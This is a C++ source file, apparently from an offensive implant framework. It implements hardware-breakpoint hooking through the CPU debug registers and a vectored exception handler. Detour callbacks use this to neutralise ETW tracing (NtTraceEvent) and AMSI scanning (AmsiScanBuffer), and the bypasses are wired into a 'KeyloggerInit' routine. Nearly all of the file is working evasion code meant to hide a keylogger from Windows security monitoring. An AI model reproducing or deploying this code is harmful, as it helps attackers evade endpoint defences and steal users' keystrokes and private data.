#include <General.hpp>

auto DECLFN Hwbp::SetDr7(
    _In_ UPTR ActVal,
    _In_ UPTR NewVal,
    _In_ INT  StartPos,
    _In_ INT  BitsCount
) -> UPTR {
    if (StartPos < 0 || BitsCount <= 0 || StartPos + BitsCount > 64) {
        return ActVal;
    }
    
    UPTR Mask = (1ULL << BitsCount) - 1ULL;
    return (ActVal & ~(Mask << StartPos)) | ((NewVal & Mask) << StartPos);
}

auto DECLFN Hwbp::Init( VOID ) -> BOOL {
    G_INSTANCE

    if ( Instance->Hwbp.Init ) return TRUE;

    PVOID ExceptionHandler = (PVOID)&Hwbp::HandleException;

    Instance->Hwbp.Handler = Instance->Win32.RtlAddVectoredExceptionHandler(
        TRUE, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler
    );

    Instance->Hwbp.Init = TRUE;

    return TRUE;
}

auto DECLFN Hwbp::Install(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ PVOID Callback
) -> BOOL {
    G_INSTANCE

    if (Drx < 0 || Drx > 3) return FALSE;

    Instance->Hwbp.Callbacks[Drx] = (UPTR)Callback;
    Instance->Hwbp.Addresses[Drx] = Address;


    return Hwbp::SetBreak(Address, Drx, TRUE);
}

auto DECLFN Hwbp::SetBreak(
    UPTR  Address,
    INT8  Drx,
    BOOL  Init
) -> BOOL {
    G_INSTANCE

    if (Drx < 0 || Drx > 3) return FALSE;

    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE   Handle = NtCurrentThread();
    NTSTATUS Status = STATUS_SUCCESS;

    Status = Instance->Win32.NtGetContextThread(Handle, &Ctx);


    if (Init) {
        (&Ctx.Dr0)[Drx] = Address;
        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // active breakpoint
    } else {
        (&Ctx.Dr0)[Drx] = 0;
        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // desactive breakpoint
    }
    
    Status = Instance->Win32.NtContinue( &Ctx, FALSE );

    return NT_SUCCESS(Status);
}

auto DECLFN Hwbp::GetArg(
    _In_ PCONTEXT Ctx,
    _In_ ULONG    Idx
) -> UPTR {
#ifdef _WIN64
    switch (Idx) {
        case 1: return Ctx->Rcx;
        case 2: return Ctx->Rdx;
        case 3: return Ctx->R8;
        case 4: return Ctx->R9;
    }
    return *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID)));
#else
    return *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID)));
#endif
}

auto DECLFN Hwbp::SetArg(
    _In_ PCONTEXT Ctx,
    _In_ UPTR     Val,
    _In_ ULONG    Idx
) -> VOID {
#ifdef _WIN64
    switch (Idx) {
        case 1: Ctx->Rcx = Val; return;
        case 2: Ctx->Rdx = Val; return;
        case 3: Ctx->R8 = Val; return;
        case 4: Ctx->R9 = Val; return;
    }
    *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID))) = Val;
#else
    *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID))) = Val;
#endif
}

auto DECLFN Hwbp::HandleException(
    EXCEPTION_POINTERS* e
) -> LONG {
    G_INSTANCE


    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    INT8 Drx = -1;
    for ( INT8 i = 0; i < 4; i++ ) {
        if ( e->ExceptionRecord->ExceptionAddress == (PVOID)Instance->Hwbp.Addresses[i] ) { 
            Drx = i;
            break;
        }
    }

    if (Drx == -1 || !Instance->Hwbp.Callbacks[Drx]) {
        return EXCEPTION_CONTINUE_SEARCH;
    }


    Hwbp::SetBreak( Instance->Hwbp.Addresses[Drx], Drx, FALSE);


    VOID ( * CallBackRun )( PCONTEXT )= reinterpret_cast<decltype(CallBackRun)>(Instance->Hwbp.Callbacks[Drx]);
    CallBackRun(e->ContextRecord);


    Hwbp::SetBreak( Instance->Hwbp.Addresses[Drx], Drx, TRUE);


    return EXCEPTION_CONTINUE_EXECUTION;
}

auto DECLFN Hwbp::PatchExitDetour(PCONTEXT Ctx) -> VOID {
    Ctx->Rax = 0;
    Ctx->Rip = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof(PVOID);
} 

auto DECLFN Hwbp::KeyloggerInit( INT32 BypassFlags ) -> BOOL {
    G_INSTANCE

    if (!Hwbp::Init()) return FALSE;

    BOOL Success = TRUE;

    if ( BypassFlags ) {
        if ( BypassFlags == KEYLOGGER_BYPASS_ETW || BypassFlags == KEYLOGGER_BYPASS_ALL ) {
            Success = Hwbp::Install( (UPTR)Instance->Hwbp.NtTraceEvent, Dr::x1, (PVOID)Hwbp::EtwDetour );
            if ( ! Success ) return Success;
        }

        if ( BypassFlags == KEYLOGGER_BYPASS_AMSI || BypassFlags == KEYLOGGER_BYPASS_ALL ) {
            Success = Hwbp::Install( (UPTR)Instance->Hwbp.AmsiScanBuffer, Dr::x2, (PVOID)Hwbp::AmsiDetour );
            if ( ! Success ) return Success;
        }
    }

    return Success;
}

auto DECLFN Hwbp::Clean() -> BOOL {
    G_INSTANCE

    CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    
    Instance->Win32.NtGetContextThread( NtCurrentThread(), &Ctx );
    
    Ctx.Dr0 = 0;
    Ctx.Dr1 = 0;
    Ctx.Dr2 = 0;
    Ctx.Dr3 = 0;
    Ctx.Dr7 = 0;
    
    for (INT8 i = 0; i < 4; i++) {
        Instance->Hwbp.Callbacks[i] = (UPTR)nullptr;
        Instance->Hwbp.Addresses[i] = 0;
    }

    Instance->Win32.RtlRemoveVectoredExceptionHandler( Instance->Hwbp.Handler );
    
    return Instance->Win32.NtContinue( &Ctx, FALSE );
}

auto DECLFN Hwbp::KeyloggerExit() -> BOOL {
    return Hwbp::Clean();
}

auto DECLFN Hwbp::EtwDetour( PCONTEXT Ctx ) -> VOID {
    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof(PVOID);
    Ctx->Rax  = STATUS_SUCCESS;
}

auto DECLFN Hwbp::AmsiDetour( PCONTEXT Ctx ) -> VOID {
    G_INSTANCE

    Ctx->Rdx    = (UPTR)LoadApi(LoadModule(HashStr("ntdll.dll")), HashStr("NtAllocateVirtualMemory"));
    Ctx->EFlags = (Ctx->EFlags | (1 << 16)); 
}